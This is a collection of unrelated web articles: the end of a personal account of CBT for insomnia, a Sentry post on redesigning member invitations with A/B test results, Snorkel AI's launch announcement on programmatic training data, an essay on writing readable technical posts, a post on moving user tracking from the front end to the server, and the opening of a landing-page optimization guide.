-</p><ol><li><p>I could only sleep within the sleep window my therapist prescribed. This ensured that I only went to bed when my sleep drive was high.</p></li><li><p>Every time I couldn't sleep, I had to make sure I didn't stay in bed for over 20 minutes. This way, I would subconsciously re-train my mind to not associate my bed with wakefulness<sup><a href="#references">6</a></sup>.</p></li><li><p>No day time naps and no caffeine after 2pm.</p></li></ol><div><p>I was sleeping around 5 hours at the time, so we set a 6 hour window within which I could sleep (1am - 7am in my case). I kept a log of how long it took me to sleep, how long I was awake in the middle of the night and how long I slept. This data was recorded to the closest 15th minute and is self reported. At the end of each week, my therapist would alter my sleep schedule based on the previous week's data.<b> Note:</b> Time awake is the time it took me to fall asleep + my night time awakenings
</p></div><p>
At the end of week 1, I was sleeping about the same as I was before. My time awake at night though had fallen by an hour. I was falling asleep faster and I was having less interrupted sleep. We decided to stick to the same sleep schedule for week 2.
</p><p>
At the end of this week, my sleep had increased and I was consistently awake for less than an hour. We decided to expand my window by 15 minutes for week 3.
</p><p>
We followed the same rules and either expanded or kept the same sleeping window for the next few weeks.
</p><p><b>At the end of the 10 week program, I was sleeping over 7 hours a night</b>. More importantly, I wasn't spending my days worrying about my sleep.
</p><p><b>CBT-I isn't an easy solution</b>. The sleep schedules are hard to follow and the results aren't instantaneous. It takes time and effort but the reward of permanently improved sleep is well worth it. Let me know if you do decide to try it and if it helps you improve your sleep. Here's to hoping you get better sleep soon.</p><p>If you'd like to know more about CBTI and other behavioral therapy techniques to improve sleep, check out our <a href="https://www.sleepedy.com/" target="_blank" rel="nofollow noopener noreferrer">website</a>!</p><h2 id="references">References</h2><ol><li><p><a href="http://sleepeducation.org/news/2014/03/10/insomnia-awareness-day-facts-and-stats" target="_blank" rel="nofollow noopener noreferrer">Insomnia Awareness Day by the American Association of Sleep Medicine</a></p></li><li><p><a href="https://adaa.org/understanding-anxiety/related-illnesses/sleep-disorders" target="_blank" rel="nofollow noopener noreferrer">Sleep Disorders by the Anxiety and Depression Association of America</a></p></li><li><p><a href="https://www.sleepedy.com/cbt-for-insomnia" target="_blank" rel="nofollow noopener noreferrer">CBT for Insomnia: A comprehensive guide</a></p></li><li><p>Trauer, James M. et al. “<a href="https://www.ncbi.nlm.nih.gov/pubmed/26054060" target="_blank" rel="nofollow noopener noreferrer">Cognitive Behavioral Therapy for Chronic Insomnia: A Systematic Review and Meta-analysis.</a> Ann Intern Med.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><time datetime="2020-02-12T00:00">February 12, 2020</time><div><p>At its core, Sentry is a tool that alerts you to defects in your production software. But it does more than blast stack traces into your inbox: Sentry provides powerful workflows to help your team determine root cause, <a href="https://blog.sentry.io/2019/02/07/sentry-workflow-triage">triage issues</a> to your team, and keep tabs on ongoing concerns with comments and notifications.</p>
<p>These collaborative features can help you resolve problems with your software quickly. But the keyword here is <strong>collaborative</strong>; without your full team having access to Sentry, you may find yourself quickly becoming overwhelmed with an endless backlog of issues and no one to help.</p>
<p>At the end of 2019, the Growth team made it our mission to make it easier for our users to invite their teammates to join them on Sentry. To achieve this, we tackled three distinct areas:</p>
<ol>
<li>Surfacing the ability to invite users contextually</li>
<li>Expanding Sentry’s permission model to allow <em>more types of users</em> to send invitations </li>
<li>Allowing external users to request access themselves</li>
</ol>
<p>Our theory: improving the user experience of inviting users, <em>as well as</em> democratizing the process to include all team members would lead to a significant increase in team-wide adoption. <em>(Narrator: it did.)</em></p>

<p>Before we get deep into what we changed and how it impacted the bottom line, let’s quickly revisit how user invitations worked: the <em>Add Member to Organization</em> page you see below.</p>

<p>This full-page experience, tucked away deep in Sentry’s account settings, had a number of issues:</p>
<ol>
<li>Since this is a full page, reaching it meant you would be taken out of context of whatever you were doing previously</li>
<li>Its location deep in our navigation hierarchy meant discoverability was poor</li>
<li>It’s <em>unclear</em> you can actually invite multiple people at once (you can!)</li>
<li>When inviting multiple users, you could only assign the group to the same role and collection of teams</li>
</ol>
<p>Interestingly, to improve discoverability, we had previously introduced a number of “quick links” to reach this page more easily. But these links were scattered around the application, and didn’t appear contextually when users signaled intent to invite members.</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/4xiHp1Gl0HaZ0l8USGDPLr/79402583357d98cf55ad2dfda6ffe537/2-invitations.png" alt="" title="2-invitations"></p></figure><div>
<p>These user experience and discovery challenges felt like obvious starting places. But instead of just settling for a new “improved” form, we decided to rethink the entire experience from the ground up.</p>

</a>The new member invitation modal</h2>
<p>It’s probably not a surprise that our first instinct was to convert this page into a modal –&nbsp;one that manages to squeeze all of the capabilities shown earlier into a smaller, more concise experience. It actually does one better: the modal is clearer in indicating that you can invite multiple users, and allows you to set unique permissions for each invitee.</p>

<p>While modals are sometimes overused in web applications, we believed this approach would solve our key discoverability and navigation concerns: it can be shown contextually without leaving the current page, and completing the form returns you to what you were doing.</p>
<p>To that point, we additionally introduced buttons to launch this <em>Invite New Members</em> modal contextually throughout Sentry:</p>
<ul>
<li>Viewing an issue and notice a <a href="https://docs.sentry.io/workflow/releases/?platform=node#after-associating-commits">suspect commit</a> made by a coworker? If they’re not already part of your Sentry organization, you can now invite them then and there.</li>
<li>Trying to assign an issue to a team member, but don’t see their name in the assignee list? You now have the option to invite them right in the dropdown.</li>
<li>Creating a new team? Now you can invite new members directly to that team as you go.</li>
</ul>

</a>Democratizing invitations</h2>
<p>As we began rolling out our new <em>Invite New Members</em> experience across the application, we came to a sobering realization: only roughly <strong><em>half</em></strong> of Sentry users could actually use our new modal. That’s because historically, only those with Owner or Manager-level permissions could invite other team members. Combined, users with these permissions accounted for less than 50% of active users.</p>

<p>Restricting the ability to add new users to account administrators is pretty common practice for software tools, and Sentry is no exception. When an employee onboards on a new team, it’s common to see an exchange like this:</p>
<blockquote>
<p>Alice: Oh awesome, we use Sentry. Can you add me to the organization?
Bob: Ah, I can’t invite you. Maybe ask Jen?</p>
</blockquote>
<p>In a perfect world, one of your administrators is tracked down, and they manually add the new teammate to the account. But sometimes that person is unknown, or is on a vacation, or maybe it takes them days or weeks or even months.</p>
<p>We began asking ourselves: what if we could unlock team members to fast-track this whole process and invite members themselves? This led to our next major change: updating our permission model to allow for <strong>members to request to invite other members.</strong></p>

<p>Now, when non-administrators open up the Invite New Members modal, it changes contextually to become a “request to invite” rather than a direct invitation. Hitting “send” kicks off an email to all organization administrators, who are prompted to approve any outstanding requests.</p>

<p>At this point, we had built what we thought was a fantastic new user experience and we just <em>doubled</em> the number of users who could take advantage of it. But this exercise of opening up user invitations got us thinking: what if there was an even <em>further</em> source of untapped users we weren’t reaching?</p>

</a>Removing the middleman entirely</h2>
<p>In the last section, we highlighted a scenario where one teammate asks another teammate for access to Sentry. And because of our recent changes, users can request to invite their teammates themselves instead of having to track down and ask their account administrator.</p>
<p>But this scenario still has a gatekeeping element: the new teammate has to ask <em>another</em> teammate for access. What if the new teammate spots an alert from Sentry in Slack stemming from their recent changes, and no one’s around to grant them access? Unfortunately, they’d land on an authentication wall that would prevent them from going any further.</p>

<p>This begged the question: was there an untapped source of potential users we weren’t reaching by restricting invitations <em>only</em> to active Sentry users? What if new users didn’t have to ask anyone at all?</p>
<p>So, to keep this party going, we dug in and additionally made it possible for <strong>external users to request to join an organization</strong>.</p>

<p>Now when a user lands on an Organization’s login page, they have the option to “Request to join”, which asks for the user’s name and email address. Once they hit send, the organization owners are sent an email that prompts them to approve the join request. Just in case, there’s also a call-to-action to disable the feature entirely for their organization.</p>

<p>Having developed a new contextual invitation modal and a pair of invite-friendly permission changes, we were <em>feeling</em> confident that these changes were going to have a strong impact on user behavior. It was time now to put our money where our code was, and verify that all this hard work actually moved the needle.</p>

</a>A/B testing the impact</h2>
<p>Our standard procedure for validating the efficacy of product changes is through A/B testing (also known as split testing). This means instrumenting our application code to serve different experiences to segments of users over the same time period, and comparing the results. This step takes extra effort, but it’s worth it –&nbsp;the alternative is to settle for a before-and-after snapshot of data, which is too easily impacted by external factors like seasonality or marketing pushes.</p>
<p>ℹ️ <em>To learn more about how we perform A/B testing at Sentry, please see <a href="https://blog.sentry.io/2019/05/09/easy-ab-testing-with-planout">this earlier blog post</a>.</em></p>
<p>It’s easy to get carried away with A/B testing, and having so many permutations that you don’t have enough data to be statistically significant. So, to simplify things, we decided that all treatments would get the new modal experience, and our “treatment” groups would focus on the new permission changes.</p>
<p>This left us with 4 distinct treatments that we rolled out to 4 equally-sized customer segments:</p>
<ol>
<li><strong>Baseline</strong> (new modal only)</li>
<li><strong>Request to Invite</strong> (user invites another user)</li>
<li><strong>Request to Join</strong> (external user requests to join)</li>
<li><strong><em>Both</em></strong> Request to Invite and Request to Join are enabled together</li>
</ol>
<p>Our main criteria for determining success: which of these treatments would result in <strong>an increase in <em>accepted</em> invitations</strong> (and thus new users)?</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/rlobEVJ4FCzWbU1tmPqqb/8ed779f9a63aa3382e5590cfa8e4bec1/11-invitations_2_.png" alt="" title="11-invitations"></p><figcaption><p>% of accepted invitations relative to baseline</p></figcaption></figure><div>
<p>After 30 days, the results became clear (not to mention, statistically significant):</p>
<ul>
<li><strong>11%</strong> more users accepted invitations in the <em>Request to Invite</em> treatment vs. the baseline</li>
<li><strong>9%</strong> more users accepted invitations in the <em>Request to Join</em> treatment vs. the baseline</li>
<li><strong>21%</strong> more users accepted invitations who had both <em>Request to Invite</em> and <em>Request to Invite</em> treatments enabled</li>
</ul>
<p>It’s probably not a surprise that allowing a wider set of users to invite team members resulted in more users inviting team members. It’s also probably not a surprise that enabling both feature sets at the same time was even better (given that they complement each other)!</p>

                  <p>
                      Today I’m excited to announce Snorkel AI’s launch out of stealth!
                      Snorkel AI, which spun out of the Stanford AI Lab in 2019, was founded on two simple premises: first, that the labeled <b>training data</b>  machine learning models learn from is increasingly what determines the success or failure of AI applications.
                      And second, that we can do much better than labeling this data entirely by hand.
                  </p>
                  <p>
                      At the Stanford AI lab, the Snorkel AI founding team spent over four years developing new <b>programmatic</b> approaches to labeling, augmenting, structuring, and managing this training data.
                      We were fortunate to develop and deploy early versions of our technology with some of the world’s leading organizations like <a href="https://ai.googleblog.com/2019/03/harnessing-organizational-knowledge-for.html">Google</a>, <a href="https://dl.acm.org/doi/abs/10.1145/3329486.3329492">Intel</a>, <a href="https://arxiv.org/abs/1909.05372">Apple</a>, <a href="https://www.sciencedirect.com/science/article/pii/S2666389920300192">Stanford Medicine</a>, resulting in <a href="https://www.snorkel.ai/technology#reference">over thirty-six peer-reviewed publications</a> on our findings; innovations in weak supervision modeling, data augmentation, multi-task learning, and more; inclusion in university computer science curriculums; and deployments in popular products and systems that you’ve likely interacted with in the last few hours.
                  </p>
                  <p>
                      Through all this academic tinkering and industry spelunking, we realized two things: first, that this concept of labeling and building training data programmatically, rather than by hand, had transformational potential to make machine learning more iterative, auditable, faster to deploy, and ultimately, more practical.
                      And second, that these ideas changed not just how you label training data, but so much of the entire lifecycle and pipeline of ML: how knowledge and feedback is injected; how models are constructed, trained, versioned, and monitored; how entire pipelines are developed iteratively; and how the full set of stakeholders in any ML deployment, from subject matter experts to ML engineers, are incorporated into the process.
                  </p>
                  <p>
                      In other words, we saw that this shift to programmatic training data required a top-to-bottom rewrite of the entire ML development and deployment process.
                      With the support of some amazing investors (Greylock, GV, In-Q-Tel, and others) and incredible early customers, we’ve spent the last year doing just this: building and deploying <a href="https://www.snorkel.ai/platform">Snorkel Flow</a>, an end-to-end platform to support this new vision of the ML process.
                  </p>
                  <h2>The Training Data Bottleneck</h2>
                  <p>
                      Snorkel Flow was motivated first and foremost by a growing realization that training data had become the key bottleneck in much of ML pipeline and AI application development.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/f63e7bd828cf6019ca0add38ca51ca4050dfeea5/288e4/images/training_data_bottleneck.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/f63e7bd828cf6019ca0add38ca51ca4050dfeea5/288e4/images/training_data_bottleneck.png"></p><p>
                      <b>Today’s ML successes often rest on a hidden cost: massive, hand-labeled training datasets.</b>
                      In the last decade, we’ve seen a tectonic shift in AI and ML towards powerful but data-hungry representation learning models.
                      These models—often deep learning architectures—are not only more powerful at obviating traditionally manual development tasks like feature engineering and bespoke model design, but also have never been more accessible in the open source.
                      However, there’s no such thing as a free lunch: these models are highly complex, with tens to hundreds of millions of parameters, and they require massive labeled training datasets to learn from.
                      And, other than in special scenarios where labels are naturally derivative of existing processes, these training datasets need to be labeled by hand.
                  </p>
                  <p>
                      <b>The hand-labeled training data interface to ML has enabled tremendous progress, but is also ridiculously broken.</b>
                      Consider a simple example: a legal analyst at a bank wants to train a contract classification model, and wants to inject a simple heuristic into the ML model: that if “employment” is in the title, the contract should be labeled as an “Employment contract.”
                      Simple, right?
                      Not so.
                      Theoretically, to communicate this specific feature to a machine learning model via only labeling individual data points could require thousands of examples (roughly, inversely proportional to the sparsity of the feature space).
                      From this perspective, it’s like playing 20 questions rather than just communicating the answer directly—fine if you have a massive question-answer bank, but otherwise wholly impractical.
                  </p>
                  <p>
                      <b>Manually labeling training data is prohibitively expensive–especially when expertise and privacy are required.</b>
                      Building training datasets often requires <a href="http://nytimes.com/2018/11/25/business/china-artificial-intelligence-labeling.html">armies of human labelers</a> at massive cost and time expense.
                      For example, ImageNet—one of the foundational projects behind ML’s current explosive progress—took <a href="https://qz.com/1034972/the-data-that-changed-the-direction-of-ai-research-and-possibly-the-world/">over two years</a> to create.
                      However, labeling cats, dogs, stop signs, and pedestrians is one thing; labeling data like medical images, legal and financial contracts, government documents, user data, and network data requires <b>stringent privacy protections</b> and <b>subject matter expert labelers</b>.
                      This means for sectors like financial services, government, telecommunications, insurance, healthcare, and more, creating training data (and by extension, using ML) is either a hugely expensive on-premise activity—or more often, one that is just not feasible to tackle, let alone practical.
                  </p>
                  <p>
                      <b>Iterative development is not possible with hand-labeled data.</b>
                      From an engineering and data science perspective, manually labeled training data fundamentally breaks the ability to quickly iterate, which is absolutely essential in real world settings where input data, output goals, and annotation schema change all the time.
                      From a business perspective, training data is an expensive asset that can’t be reused across projects, can often depreciate to worthless overnight due to changing conditions or business goals, and that presents growing risks—everything from <a href="https://web.archive.org/web/20200703104247/https://cloud.google.com/ai-platform/data-labeling/docs">COVID-related delays</a> to <a href="https://www.theverge.com/2018/1/12/16882408/google-racist-gorillas-photo-recognition-algorithm-ai">issues of bias</a>.
                  </p>
                  <h2>A New Input Paradigm for ML: Programming with Data</h2>
                  <p>
                      With Snorkel Flow, rather than needing to hand-label any training data, users develop <b>programmatic operators</b> that label, augment, and build training data to drive the ML development process.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/ae088a1fc7f3c6326c2e7285bc2d3c7e88907290/ad302/images/platform-label-v3.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/ae088a1fc7f3c6326c2e7285bc2d3c7e88907290/ad302/images/platform-label-v3.png"></p><p>
                      <b>Programmatically labeling and building training data.</b>
                      With Snorkel Flow, the idea is to instead communicate this domain knowledge directly via a programmatic operator like a <a href="https://papers.nips.cc/paper/6523-data-programming-creating-large-training-sets-quickly">labeling function</a>.
                      For example, our legal analyst could write a labeling function that labels documents as “Employment contracts” if the word “employment” is in the title, and otherwise abstains; or, a range of more complex and powerful labeling functions relying on internal knowlegebases, models, legacy heuristics, and more.
                      This approach of effectively programming ML with data is simple, direct, interpretable, modifiable, and agnostic to the model used (which is especially important given the ongoing Cambrian explosion of powerful new open source model architectures).
                  </p>
                  <p>
                      <b>The directness of rules with the flexibility of ML.</b>
                      Rule-based systems have long been used in industry for certain tasks—as an input, individual rules have the desirable property of being direct and interpretable.
                      However, rules can also be brittle, and lack the robustness, flexibility, and sheer power of ML approaches.
                      With Snorkel Flow, you get the best of both worlds: rules (and other interpretable resources) as inputs, and powerful ML models that generalize beyond these rules as the output.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/8b9653f8e7b7803550e9afd55284d43beb190fbe/e2b34/images/platform-manage-v3.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/8b9653f8e7b7803550e9afd55284d43beb190fbe/e2b34/images/platform-manage-v3.png"></p><p>
                      <b>A more powerful yet weaker supervision.</b>
                      At the same time that this programmatic supervision is advantageous in several transformational ways, it is also messier and raises fundamental new technical challenges.
                      The labeling functions and other programmatic operators that users write will have varying unknown accuracies and expertise areas, will overlap and disagree with each other, and may be correlated in tangled and unknown ways.
                      We focused on the algorithmic and systems solutions to these issues over <a href="https://www.snorkel.ai/technology">four-plus years of research</a>, showing both empirically and theoretically that with the right techniques, these deep technical challenges can be overcome.
                      The result: training data that is as good as or better than hand-labeled data, and immensely more practical to create and maintain.
                  </p>
                  <p>
                      <b>Beyond labeling: data augmentation, slicing, monitoring, and more.</b>
                      In high-performance production ML, training data is about a lot more than labeling.
                      For example, data augmentation is a cornerstone technique wherein transformed copies of data (e.g. rotated or blurred images) are used to expand the sizes of training datasets, and make resulting models more robust.
                      Slicing or structuring training datasets into more or less important and difficult subsets is also a critical part of managing production ML. 
                      Finally, monitoring and adapting not just models but …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of today’s best bloggers in the functional programming space is <a href="https://chrispenner.ca/">Chris Penner</a>. Despite this, Chris is criminally underrated—nobody I talk to seems to know of his work. Go check him out as soon as you finish reading this post!</p>
<p>This is reasonably pervasive phenomenon in our subculture; there’s lots of fantastic work being produced, but for one reason or another, it falls between the cracks. I’d propose the biggest obstacle is that most FP writing <em>isn’t optimized to be read.</em></p>
<p>So I’d like to take some time today and talk about common failure modes in technical writing. If you don’t have a checklist you run through before publishing a post, you’ll probably get a lot of benefit from internalizing this advice.</p>
<p>The value? You’ll make it easier for people to understand what you’re trying to tell them. Which is why you’re writing in the first place, right? The good news is that none of this is magic—just some simple guidelines for structuring your content.</p>
<h2 id="the-guiding-principle">The Guiding Principle</h2>
<p>Here’s the biggest thing to keep in mind: your reader doesn’t really care what you have to say. You get maybe four sentences to convince them that your essay is worth their time. If you haven’t made your case by then, you’ve probably lost them to the next tab they binge-opened.</p>
<p>Even after you’ve convinced them that it’s a valuable read, you need to continue assuring them that you’re not wasting their time. If you take too long to get to the point, or if you make the information too hard to find on a quick skim, you’ve lost them again.</p>
<p>As a result, alongside your technical content, you have two primary goals to focus on:</p>
<ul>
<li>Provide strong, concise motivations for everything you want to talk about.</li>
<li>Make it easy to skim.</li>
</ul>
<p>If you can do these two things, you’re already most of the way to better engagement.</p>
<h2 id="writing-strong-motivations">Writing Strong Motivations</h2>
<p>People care about solutions to problems they have, or expect to have one day. They care about other things too, but it’s not really relevant to us today.</p>
<p>With this in mind, you want to tailor your motivations in terms of <em>solutions to problems.</em></p>
<p>Here are some good examples of problems that you’ve probably run into (and links to their solutions for you to read later):</p>
<ul>
<li><a href="https://chrispenner.ca/posts/adjunction-battleship">Ed Kmett writes shitty documentation</a></li>
<li><a href="https://reasonablypolymorphic.com/blog/higher-kinded-data/">I have lots of types that need to evolve at the same time</a></li>
<li><a href="http://thinkingwithtypes.com/">There is no good place to learn type-level programming</a></li>
</ul>
<p>Bad examples of motivating documents are things that assume you care <em>simply because they exist.</em> This is <a href="http://hackage.haskell.org/package/pipes-4.3.9/docs/Pipes-Tutorial.html">pretty</a> <a href="http://yannesposito.com/Scratch/en/blog/Yesod-tutorial-for-newbies/">common</a> of libraries’ tutorials. The same document that convinces you to use a technology should also show you how.</p>
<p>As a more general rule, focusing on <em>why</em> is going to be more valuable than on <em>how.</em></p>
<p>Why should someone care, and why your solution is a good one.</p>
<p>“How” without a “why” suggests a contrived solution to a made-up problem. In other words, it’s easily read as “who cares?”</p>
<h2 id="understanding-how-people-read">Understanding How People Read</h2>
<p>People who spend lots of time reading have good heuristics for skipping lots of text. If you understand these heuristics, you can make it easy for people to find what they’re looking for. And remember: they’re looking for reasons to continue reading.</p>
<p>There are two behaviors here. The first is what I call “skimming for concepts”—which is that people will attempt to determine what text is about at a high-level. They’re looking for <em>what you’re trying to tell them</em>, as opposed to <em>what you’re actually saying.</em></p>
<p>When skimming, people are likely to read only the headings and the first two sentences of a paragraph. If they’re convinced they know what you have to say, they’ll skip to the next paragraph. If several paragraphs in a row don’t seem relevant, they’ll skip to the next heading.</p>
<p>If the next heading also fails to grab their attention, they’ll probably give up.</p>
<p>The solution is to structure your argument as a tree. Headings must provide enough information to let someone know whether or not they care about the following prose.</p>
<p>This also means that the first sentence of each paragraph should be sufficient to understand the rest of the paragraph. The remaining sentences are only allowed to reinforce or give details of the first sentence. One paragraph equals one idea.</p>
<p>Roughly speaking, the hierarchy of your document should look like this:</p>
<ul>
<li>Document
<ul>
<li>Heading
<ul>
<li>First sentence
<ul>
<li>Rest of paragraph</li>
</ul></li>
</ul></li>
</ul></li>
</ul>
<p>Maybe you feel like it’s hard to know how much knowledge to assume your readership knows. Understanding how people read makes this a non-issue. Present as much information as is necessary to understand your point, but make it easy to skip if people already know it. Those who don’t yet know will learn, those who do can skip past, and both camps will appreciate it.</p>
<p>After you’ve convinced your reader that they care what you have to say, they’re more willing to read what you <em>actually have to say.</em> When the reader is ready to dive in, that’s when you can make the finer points of your argument.</p>
<p>It’s unlikely that anyone is going to read every word of your essay. It’s even less likely that they’ll read them all in order.</p>
<h2 id="stumbling-blocks">Stumbling Blocks</h2>
<p>Now that you’ve got people ready to listen to you, it’s important to keep them on the same page as you. You really need to stay on top of anything that might break their focus.</p>
<p>Use short sentences. If it’s too hard to parse, people won’t.</p>
<p>Make sure your spelling and grammar have no egregious problems. You don’t need to have perfect command of the language, but you need to be able to signal that you’re trustworthy-enough to listen to. Don’t underestimate how much credibility you’ll lose from blatantly bad spelling and grammar.</p>
<p>This stuff is relatively common-sense.</p>
<p>What might be less so is that you also need to stay on top of conceptual stumbling blocks. If your argument makes a jump that feels poorly motivated or references something potentially unfamiliar, expect that your reader will experience vertigo.</p>
<p>Most of the ideas we talk about in functional programming <em>are not easy,</em> and it doesn’t do anyone any favors to pretend this isn’t so. Expect that your readers will be pretty similar to you; if you had a problem understanding a piece of your topic, <em>call that out.</em> Point out the obstacle. Point out what they might be thinking, and then very explicitly show them what they should be thinking instead.</p>
<p>For example, if your code sample uses a <a href="https://en.wikipedia.org/wiki/Functional_dependency">functional dependency</a>, it might be worth a short sentence saying “that funny bar thing is a functional dependency.” Give a tiny summary of its purpose, and provide a link for them to learn more if they need to.</p>
<p>Another illustration: if <em>you</em> originally got confused that an “algebra in recursion schemes” is not the same thing as the algebra you learned in high-school, your readers probably will too. The first time you say “algebra” in the new context, say “this is a misleading term. This has nothing to do with solving equations like you did in high-school.”</p>
<p>More important than what you’re saying is what you’re <em>not saying.</em> If you’re giving examples of something that fits a pattern, make sure you give examples of things that <em>do not</em> fit the pattern. A concept that is applicable everywhere is useful nowhere.</p>
<p>Give lots of examples. Nobody I know learns via mathematical statements, nor do they learn via long, wordy, abstract prose. People learn by seeing lots of examples, and being told explicitly how these examples relate to one another. The mathematical statements are only useful <em>after</em> you have the intuition, so save them for an appropriate time.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The takeaway advice from this essay is that <em>if you want lots of readers, you must make it easy for them to read.</em></p>
<p>To that end, pay lots of attention to motivation. Why should people care what you have to say? What value does it give <em>them?</em></p>
<p>Focus your energy on the beginnings—both of the essay as a whole, and of each paragraph. People who are unconvinced by your essay’s value will skim their way through it, and they will do that by reading only the beginnings of things.</p>
<p>Make your information easy to find. Structure your argument in a tree, and make sure it supports random-access. Nobody is going to read the whole thing from start to finish. Instead they’re going to jump around, ignoring the pieces they already know, and looking for the bits they don’t.</p>
<p>Use lots of short paragraphs. A paragraph should correspond to a single idea.</p>
<p>Anticipate which parts of your argument will be difficult for your readers, and be proactive in trying to assuage those difficulties. Give lots of examples of what you’re talking about, and more importantly, what you’re not talking about.</p>
<p>Point out where you went into the weeds while learning this stuff. Steer readers away from common mistakes and misconceptions.</p>
<p>And finally, end on a high note. Leave people with a good feeling, and it will incentivize them to get to the bottom of your next piece. Inspirational calls to action are a good way to go out.</p>
<blockquote>
<p>Tell them what you’re going to tell them. Then tell them. Finally, tell them what you told them.</p>
<p>-Unknown</p>
</blockquote>
<p>Funny and poignant quotes are too.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>I’m here to warn you about the dangers of front-end user tracking. Not because <a href="https://donttrack.us/">Google is tracking you</a>, but because it doesn’t track you quite well enough.</p>

<p>What follows is a story in three parts: the front-end tracking trap I fell into, how we dug ourselves out, and how you can go around the trap altogether.</p>

<h2 id="part-1-a-cautionary-tale">Part 1: A Cautionary Tale</h2>

<p>The year was 2019. Opendoor was signing my paychecks.</p>

<p>We were launching our shiny new homepage.</p>

<p><img src="https://paper-attachments.dropbox.com/s_797F39BD41EFDEC54D5CBA97D7296FCBDAF1FBE1044BD81BCD0D8F34808AEF50_1593573820734_image.png" alt=""></p>

<p>We had spent a month migrating our landing pages from the Rails monolith to a shiny new Next.JS app. The new site was way faster and would therefore convert better, saving us millions of dollars annually in Facebook and Google ad costs.</p>

<p>Being responsible, we ran the roll-out as an A/B test, sending half of the traffic to the old site so we could quantify our impact<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

<p>The impact we’d made was making things worse. Way worse. The new site got crushed.</p>

<h3 id="what-happened">What happened?</h3>

<p>WTF. Google <a href="https://web.dev/measure/">had told us</a> our new page was way better. The new site even felt snappier.</p>

<p>“Figure it out.” The engineers on revamp paired up with a Data Scientist and went to go figure out what the hell was going on. They started digging into every nook and cranny of the relaunch.</p>

<p>A week went by. Our director peaked in curiously. Murmurs about postponing the big launch started to circle. Weight was gained; hair was lost.</p>

<p>Ultimately, the clue that cracked the case was bounces. Bounces (IE, people leaving right away) were way up on the new site. But it was clear the new site loaded much faster. Bounce rates should have gone down, not up.</p>

<p>How did we measure bounce rates? We dug in.</p>

<h3 id="how-bounces-work">How bounces work</h3>
<p><img src="https://cdn.shopify.com/s/files/1/2017/9247/products/Bebop-8-in-1-bouncy-castle-with-kids_600x.jpg?v=1553009477" alt="">
 When the homepage loads, the front-end tracking code records a ‘page view’ event. If the ‘page view’ event was recorded, but then nothing else happens, analytics will consider that user to have “bounced”.</p>

<p>It turned out that the old site was so slow that many folks left before their ‘page view’ ever got recorded. In other words, the old site was dramatically under-reporting bounces.</p>

<p>It was like comparing two diet plans and saying the one where half the subjects quit was better because the survivors tended to lose weight.</p>

<h2 id="part-2-how-we-fixed-bounces">Part 2: How we fixed bounces</h2>

<p>If the front-end was under-reporting bounces, could we find a way to track a ‘page view’ without relying on the client?</p>

<p>There was. It was on the server - though in our example, we tracked the event in Cloudflare, <a href="https://medium.com/opendoor-labs/cloudflare-workers-opendoor-landing-page-infrastructure-824853a34551">which we were already using</a> for our A/B test setup.</p>

<p>We started logging a <code>page-about-to-be-viewed</code> event instead of the <code>page view</code> event, which was really <code>page-viewed-long-enough-for-the-tracking-javascript-to-load</code> event. We updated our bounce metrics calculation.</p>

<p>Lo and behold, the new infra was better after all!  We had been giving our old page too much credit this entire time, but nobody was incentivized to cry wolf.</p>

<h2 id="part-3-front-end-tracking-done-right">Part 3: Front-end tracking done right</h2>
<p>Forsake the front-end. Tis a terrible place to track things, for at least three reasons.</p>

<h3 id="1-performance">1. Performance</h3>
<p>The less JavaScript (especially third-party) you have on your landing pages, the better. It’s a better customer experience, and it improves your page’s conversion and quality score.</p>

<p>We calculated that getting rid of Segment and Google Tag Manager on our landing pages would yield about 10-15 points of <a href="https://kinsta.com/blog/google-pagespeed-insights/">Google PageSpeed</a>. Google takes PageSpeed into account for Quality Score, which in turn makes your CPMs/CPC cheaper.</p>

<h3 id="2-fidelity">2. Fidelity</h3>
<p>Somewhere between a <a href="https://www.socialmediatoday.com/news/global-ad-blocking-behavior-2019-infographic/551716/">half and a quarter</a> of all users have ad-blockers set up. If you’re relying on a pixel event to inform Google / Facebook of conversions, you’re not telling them about everybody.
 This makes it harder for their machine learning to optimize which customers to send your way. Which means you’re paying more for the same traffic.</p>

<h3 id="3-powerlessness">3. Powerlessness</h3>
<p>You want to believe that you have control of the JavaScript running on your page, but how many browser extensions does the user have? How much has actually loaded? Wait, what version of IE is this person on?</p>

<h3 id="what-should-i-do-instead">What should i do instead?</h3>

<p>Take all your client-side tracking, and move it</p>

<ul>
  <li>to <a href="https://www.cloudflare.com/learning/serverless/glossary/what-is-edge-computing/">the edge</a> for things like page views (the server is fine, here, though, if you <a href="https://en.wikipedia.org/wiki/KISS_principle">KISS</a>)</li>
  <li>to the server for events that have consequences, like button presses.</li>
  <li>to publishers for paid traffic conversion, inform Google/Facebook via their server-side APIs when feasible, instead of trying to load a pixel</li>
</ul>

<h3 id="faqs--caveats">FAQs &amp; Caveats</h3>

<h4 id="does-your-approach-break-identifying--cookie-ing-users-so-you-can-retarget-effectively">Does your approach break identifying &amp; cookie-ing users, so you can retarget effectively?</h4>
<p>Shouldn’t. We used Segment to <code>identify</code> anonymous users; the change was just calling <code>.identify()</code> in Cloudflare (and handling the user cookie there).</p>

<h4 id="i-heard-server-side-conversion-tracking-for-google-and-facebook-doesnt-perform-as-well">I heard server-side conversion tracking for google and facebook doesn’t perform as well.</h4>
<p>I’ve heard (and experienced) this as well. We’re entering black magic territory here… try it.</p>

<p>Need to&nbsp;<strong>optimize your website or landing page</strong>&nbsp;in a hurry?</p>
<p>While there’s no one-size-fits-all approach to conversion optimization, there are some recurring recommendations that come up again and again when I’m consulting with clients.</p>
<p>And in this article, I break down seven such landing page optimization tips for you, one-by-one.</p>
<p>Each tip is based off my <a href="https://growthmarketer.co/framework/">7 Question Landing Page Framework</a>, and backed by years of data and testing.</p>
<p><em>Let’s go!</em></p>
<h2>Focus on clarity</h2>
